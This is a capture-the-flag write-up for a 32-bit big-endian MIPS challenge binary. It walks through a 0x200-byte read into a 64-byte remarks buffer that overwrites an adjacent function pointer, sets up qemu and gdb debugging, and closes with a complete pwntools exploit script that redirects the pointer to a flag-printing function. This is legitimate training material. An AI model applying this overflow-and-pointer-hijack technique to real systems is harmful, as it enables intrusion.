### i. challenge overview
![[relay_1.png]]
- architecture: MIPS 32-bit (big endian)
- mitigations: no PIE
- define the `User` struct for readability:
```
00000000 struct User // sizeof=0x74
00000000 {
00000000     char username[32];
00000020     int clearance_level;
00000024     int is_authenticated;
00000028     int commands_count;
0000002C     time_t session_start;
00000030     char remarks[64];
00000070     void (*diag_func)();
00000074 };
```
- decompiled code:
```C
int __fastcall main(int argc, const char **argv, const char **envp)
{
  init_io();
  init_station();
  banner();
  run_session();
  return 0;
}
int __fastcall authenticate(User *a1)
{
  int clearance_level; // $v0
  char v3[512]; // [sp+18h] [+18h] BYREF

  printf("Callsign: ");
  read_line(v3, 512);
  strncpy(a1->username, v3, 0x1Fu);
  a1->username[31] = 0;
  printf("Access code: ");
  read_line(v3, 512);
  if ( strcmp(a1->username, "NIGHTFALL") || strcmp(v3, "SIGMA-7F") )
  {
    if ( strcmp(a1->username, "WATCHDOG") || strcmp(v3, "KEEN-EYE") )
    {
      if ( strcmp(a1->username, "OPERATOR") || strcmp(v3, "DAYSHIFT") )
        return 0;
      a1->clearance_level = 1;
    }
    else
    {
      a1->clearance_level = 2;
    }
  }
  else
  {
    a1->clearance_level = 3;
  }
  a1->is_authenticated = 1;
  a1->session_start = time(0);
  a1->commands_count = 0;
  memset(a1->remarks, 0, sizeof(a1->remarks));
  clearance_level = a1->clearance_level;
  if ( clearance_level == 2 )          
  {
    a1->diag_func = (void (*)())run_sigint_diagnostics;
  }
  else if ( clearance_level == 3 )
  {
    a1->diag_func = (void (*)())run_full_diagnostics;
  }
  else
  {
    a1->diag_func = (void (*)())run_basic_diagnostics;
  }
  return 1;
}
int __fastcall cmd_remarks(User *a1)
{
  char *remarks; // $v0
  ssize_t v3; // [sp+18h] [+18h]

  log_action(a1->username, "SET_REMARKS");
  if ( a1->remarks[0] )
    remarks = a1->remarks;
  else
    remarks = "(none)";
  printf("Current remarks: %s\n", remarks);
  printf("Enter new remarks for shift handover:\n> ");
  fflush(stdout);
  v3 = read(0, a1->remarks, 0x200u);                // buffer overflow
  if ( v3 <= 0 )
  {
    puts("\n[SESSION] Connection lost.");
    exit(0);
  }
  if ( a1->remarks[v3 - 1] == 10 )
    a1->remarks[v3 - 1] = 0;
  return puts("Remarks updated.");
}
int dump_station_keys()
{
  FILE *stream; // [sp+18h] [+18h]
  char v2[260]; // [sp+1Ch] [+1Ch] BYREF

  putchar(10);
  puts("\x1B[41m\x1B[1m *** NIGHTFALL CONTINUITY DIRECTIVE 9.1 *** \x1B[0m");
  puts("\x1B[1;33m Dumping station key material for IR retrospective...\x1B[0m\n");
  stream = fopen("flag.txt", "r");
  if ( !stream )
    stream = fopen("/home/ctf/flag.txt", "r");
  if ( stream )
  {
    while ( fgets(v2, 256, stream) )
      printf("  KEY-MATERIAL: %s", v2);
    fclose(stream);
  }
  else
  {
    puts("  KEY-MATERIAL: [file not found — check /flag.txt]");
  }
  return putchar(10);
}
```
- goal: the function `dump_station_keys()` at `0x400D9C` prints the flag
### ii. challenge analysis
#### 1. Set up debug
- use qemu to emulate MIPS and gdb-multiarch to debug it. install them with `sudo apt install qemu-user gdb-multiarch`
- Build docker `docker build --tag=pwn_relay_biz_2026 .`
- for manual debugging:
  - start docker and expose debug port 1234 with `docker run -it --rm -p 1337:1337 -p 1234:1234 -v $(pwd):/work -w /work pwn_relay_biz_2026 bash`
  - inside docker, run `qemu-mips -L /usr/mips-linux-gnu -g 1234 ./challenge/relay`
  - in another terminal, start `gdb-multiarch ./challenge/relay`
  - run these commands to connect to port 1234:
  ```GDB
  set architecture mips
  set endian big
  target remote 127.0.0.1:1234
  ```
  - set a breakpoint to continue debugging
- for scripted debugging, use the snippet below. it sets the MIPS big-endian context, starts docker, exposes the port, and connects gdb:
  ```Python
  context.arch = 'mips'
  context.endian = 'big'
  gdbscript = '''
  # add breakpoint here
  continue
  '''
  if args.GDB:
        docker_cmd = [
            "docker", "run", "-i", "--rm",
            "-p", "1234:1234",
            "-v", f"{os.getcwd()}:/work", "-w", "/work",
            "pwn_relay_biz_2026",
            "qemu-mips", "-L", "/usr/mips-linux-gnu", "-g", "1234", exe_path
        ]
        p = process(docker_cmd)
        gdb.attach(('127.0.0.1', 1234), gdbscript=gdbscript, exe=exe.path)
        sleep(2)
  ```
#### 2. analysis
- the program creates a `User` struct on the stack and prompts for login. selecting `diag` calls the function pointer at offset 112, `void (*diag_func)()`
- `cmd_remarks()` has a buffer overflow: `remarks` holds up to 64 bytes, but the function accepts up to 0x200 bytes
```C
int __fastcall authenticate(int a1)
{
	...
	memset((void *)(a1 + 48), 0, 0x40u);
	...
}
int __fastcall cmd_remarks(User *a1)
{
  ...
  v3 = read(0, a1->remarks, 0x200u);                // buffer overflow
  ...
}
```
- to check, log in with any username and try entering 72 bytes...
![[relay_2.png]]
- ...which causes a segmentation fault, even with another callsign:
![[relay_3.png]]
- the function pointer `void (*diag_func)()` is immediately after `char remarks[64]`. input beyond 64 bytes changes the pointer:
![[relay_4.png]]
- this is similar to **ret2win**: overwrite the function pointer used by `diag` with the address of `dump_station_keys()`, then select `diag` to get the flag
- verify it locally:
- after logging in, select `remarks` and enter the input:
![[relay_5.png]]
- inspect the stack after entering the input:
![[relay_6.png]]
- select `diag`, which now calls `dump_station_keys()`:
![[relay_8.png]]
- the function prints the flag:
![[relay_7.png]]
- the remote run returns the flag `HTB{r3l4y_k3ys_3xf1ltr4t3d_v14_d14g_0v3rfl0w}`
![[relay_9.png]]
### III. Proof-of-concept
```Python
#!/usr/bin/env python3
from pwn import *
import os

exe_path = './challenge/relay'
HOST = '127.0.0.1'
PORT = 1337

exe = ELF(exe_path, checksec=False)
context.binary = exe

context.arch = 'mips'
context.endian = 'big'

context.terminal = [
    'cmd.exe', '/c', 'start',
    'wt.exe', '-w', '0', 'split-pane', '-V',
    '-d', '.',
    'wsl.exe',
    '-d', 'kali-linux',
    'bash', '-c'
]

gdbscript = '''
b *0x401fbc
b *0x00401d98
continue
'''

def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    
    if args.GDB:
        docker_cmd = [
            "docker", "run", "-i", "--rm",
            "-p", "1234:1234",
            "-v", f"{os.getcwd()}:/work", "-w", "/work",
            "pwn_relay_biz_2026",
            "qemu-mips", "-L", "/usr/mips-linux-gnu", "-g", "1234", exe_path
        ]
        p = process(docker_cmd)
        gdb.attach(('127.0.0.1', 1234), gdbscript=gdbscript, exe=exe.path)
        sleep(2)
    else:
        docker_cmd = [
            "docker", "run", "-i", "--rm",
            "-v", f"{os.getcwd()}:/work", "-w", "/work",
            "pwn_relay_biz_2026",
            "qemu-mips", "-L", "/usr/mips-linux-gnu", exe_path
        ]
        p = process(docker_cmd)
        
    return p

p = start()

def sla(prompt, data):
    p.sendlineafter(prompt, data)
def sa(prompt, data):
    p.sendafter(prompt, data)
def s(data):
    p.send(data)
def sl(data):
    p.sendline(data)
def rcu(data):
    return p.recvuntil(data)
def rl():
    return p.recvline()

# ============================EXPLOIT============================

win = 0x400D9C

sla(b"Callsign: ", b"WATCHDOG")
sla(b"Access code: ", b"KEEN-EYE")

sla(b" $ ", b"remarks")
payload = b"A" * 64 + p32(win)
sa(b"> ", payload)

sla(b" $ ", b"diag")

p.interactive()
```